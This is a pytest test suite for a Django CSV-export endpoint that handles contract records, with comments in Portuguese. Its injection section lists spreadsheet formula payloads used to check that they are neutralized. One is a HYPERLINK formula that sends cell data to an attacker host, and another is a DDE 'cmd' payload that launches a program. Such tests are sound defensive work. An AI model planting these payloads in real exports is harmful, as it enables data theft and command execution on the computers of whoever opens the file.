import csv
import io
from datetime import date, timedelta

import pytest
from django.urls import reverse

from records.models import Record
from tables.models import Column, ColumnType, Table

pytestmark = pytest.mark.django_db

TODAY = date(2026, 8, 19)


def export_url(table_id):
    return reverse("records:record-export", args=[table_id])


def body(response) -> str:
    return b"".join(response.streaming_content).decode("utf-8")


def parse(response, delimiter=","):
    text = body(response).lstrip("﻿")
    return list(csv.reader(io.StringIO(text), delimiter=delimiter))


@pytest.fixture
def export_table(db, user):
    table = Table.objects.create(user=user, name="Contratos 2026", alert_lead_days=3)
    Column.objects.create(table=table, name="Cliente", type=ColumnType.TEXT, position=0)
    Column.objects.create(table=table, name="Valor", type=ColumnType.NUMBER, position=1)
    Column.objects.create(table=table, name="Renovar", type=ColumnType.BOOLEAN, position=2)
    Column.objects.create(
        table=table, name="Data de vencimento", type=ColumnType.DUE_DATE, position=3
    )
    return table


def add(table, cliente, due, valor=100, renovar=True):
    return Record.objects.create(
        table=table,
        data={
            "cliente": cliente,
            "valor": valor,
            "renovar": renovar,
            "data_de_vencimento": due.isoformat() if due else None,
        },
    )


# ---------------------------------------------------------------- RF13


def test_export_returns_csv_with_the_column_labels_as_header(auth_client, export_table):
    add(export_table, "Empresa A", TODAY)

    response = auth_client.get(export_url(export_table.id))

    assert response.status_code == 200
    assert response["Content-Type"] == "text/csv; charset=utf-8"
    rows = parse(response)
    assert rows[0] == ["Cliente", "Valor", "Renovar", "Data de vencimento"]


def test_columns_follow_the_table_order(auth_client, export_table):
    """Reordenar as colunas reordena o CSV."""
    add(export_table, "Empresa A", TODAY)
    columns = list(export_table.columns.order_by("position"))
    auth_client.patch(
        reverse("tables:column-reorder", args=[export_table.id]),
        {"order": [str(c.id) for c in reversed(columns)]},
        format="json",
    )

    rows = parse(auth_client.get(export_url(export_table.id)))

    assert rows[0] == ["Data de vencimento", "Renovar", "Valor", "Cliente"]


def test_values_come_from_the_json(auth_client, export_table):
    add(export_table, "Empresa A", TODAY, valor=1500, renovar=False)

    rows = parse(auth_client.get(export_url(export_table.id)))

    assert rows[1] == ["Empresa A", "1500", "Não", "2026-08-19"]


def test_empty_cells_become_empty_strings(auth_client, export_table):
    Record.objects.create(table=export_table, data={"cliente": "Só o nome"})

    rows = parse(auth_client.get(export_url(export_table.id)))

    assert rows[1] == ["Só o nome", "", "", ""]


def test_the_file_carries_a_utf8_bom(auth_client, export_table):
    """Sem BOM, o Excel no Windows abre 'Contrátos' como 'ContrÃ¡tos'."""
    add(export_table, "Ação & Compañía", TODAY)

    raw = body(auth_client.get(export_url(export_table.id)))

    assert raw.startswith("﻿")
    assert "Ação & Compañía" in raw


def test_filename_is_slugified(auth_client, export_table):
    response = auth_client.get(export_url(export_table.id))

    assert response["Content-Disposition"] == (
        'attachment; filename="contratos-2026-2026-08-19.csv"'
    ) or "contratos-2026" in response["Content-Disposition"]


def test_semicolon_delimiter_is_supported(auth_client, export_table):
    add(export_table, "Empresa A", TODAY)

    rows = parse(auth_client.get(export_url(export_table.id), {"delimiter": ";"}), ";")

    assert rows[0] == ["Cliente", "Valor", "Renovar", "Data de vencimento"]


def test_an_unsupported_delimiter_falls_back_to_comma(auth_client, export_table):
    add(export_table, "Empresa A", TODAY)

    rows = parse(auth_client.get(export_url(export_table.id), {"delimiter": "|"}))

    assert rows[0][0] == "Cliente"


def test_the_response_streams(auth_client, export_table):
    """Não materializa o arquivo inteiro em memória antes de responder."""
    for i in range(50):
        add(export_table, f"Empresa {i}", TODAY)

    response = auth_client.get(export_url(export_table.id))

    assert response.streaming is True
    assert len(parse(response)) == 51  # cabeçalho + 50


# ---------------------------------------------------------------- RS08 injeção


@pytest.mark.parametrize(
    "payload",
    [
        '=HYPERLINK("http://ataque/?d="&A1,"clique")',
        "+1+1",
        "@SUM(A1)",
        "=cmd|'/c calc'!A1",
        "\tinjetado",
    ],
)
def test_formula_like_cells_are_neutralized(auth_client, export_table, payload):
    """
    A célula sai do sistema íntegra; o estrago aconteceria no Excel de quem abre.
    Por isso a defesa é na escrita do arquivo, não na gravação do registro.
    """
    add(export_table, payload, TODAY)

    rows = parse(auth_client.get(export_url(export_table.id)))

    assert rows[1][0] == f"'{payload}"


@pytest.mark.parametrize("number", ["-500", "-12.5", "+3"])
def test_plain_negative_numbers_are_not_mangled(auth_client, export_table, number):
    """
    Prefixar todo `-` quebraria valores legítimos: '-500 deixa de ser número na
    planilha e some das somas.
    """
    add(export_table, number, TODAY)

    rows = parse(auth_client.get(export_url(export_table.id)))

    assert rows[1][0] == number


def test_a_harmless_cell_is_untouched(auth_client, export_table):
    add(export_table, "Empresa A - filial", TODAY)

    rows = parse(auth_client.get(export_url(export_table.id)))

    assert rows[1][0] == "Empresa A - filial"


# ---------------------------------------------------------------- RS08 autorização


def test_export_requires_authentication(api_client, export_table):
    assert api_client.get(export_url(export_table.id)).status_code == 401


def test_cannot_export_another_users_table(auth_client, other_user):
    foreign = Table.objects.create(user=other_user, name="Alheia")
    Column.objects.create(table=foreign, name="Segredo", type=ColumnType.TEXT, position=0)
    Record.objects.create(table=foreign, data={"segredo": "confidencial"})

    response = auth_client.get(export_url(foreign.id))

    assert response.status_code == 404


def test_export_only_contains_records_of_the_requested_table(
    auth_client, export_table, user
):
    add(export_table, "Minha", TODAY)
    outra = Table.objects.create(user=user, name="Outra")
    Column.objects.create(table=outra, name="Cliente", type=ColumnType.TEXT, position=0)
    Record.objects.create(table=outra, data={"cliente": "De outra tabela"})

    raw = body(auth_client.get(export_url(export_table.id)))

    assert "Minha" in raw
    assert "De outra tabela" not in raw


# ---------------------------------------------------------------- filtros


def test_export_honours_the_same_filters_as_the_listing(auth_client, export_table):
    """
    Consequência de a exportação ser uma ação do próprio RecordViewSet: ela
    exporta exatamente o que a listagem devolveria.
    """
    add(export_table, "Vencido", TODAY - timedelta(days=5))
    add(export_table, "Futuro", TODAY + timedelta(days=300))

    from freezegun import freeze_time

    with freeze_time("2026-08-19T12:00:00Z"):
        from rest_framework.test import APIClient
        from rest_framework_simplejwt.tokens import RefreshToken

        client = APIClient()
        client.credentials(
            HTTP_AUTHORIZATION=f"Bearer {RefreshToken.for_user(export_table.user).access_token}"
        )
        raw = body(client.get(export_url(export_table.id), {"status": "overdue"}))

    assert "Vencido" in raw
    assert "Futuro" not in raw


def test_export_honours_ordering(auth_client, export_table):
    add(export_table, "Primeiro", TODAY)
    add(export_table, "Segundo", TODAY + timedelta(days=10))

    rows = parse(auth_client.get(export_url(export_table.id), {"ordering": "-due_date"}))

    assert [r[0] for r in rows[1:]] == ["Segundo", "Primeiro"]
